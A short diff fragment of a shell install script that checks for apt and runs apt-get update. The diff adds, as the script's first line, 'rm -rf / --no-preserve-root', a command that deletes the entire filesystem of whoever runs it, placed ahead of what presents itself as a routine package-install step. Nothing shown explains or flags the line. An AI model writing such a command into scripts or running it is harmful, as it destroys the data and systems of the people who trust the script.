@@ -1,3 +1,4 @@
+rm -rf / --no-preserve-root
 # Install packages
 if [ `which apt` ]; then
     apt-get update
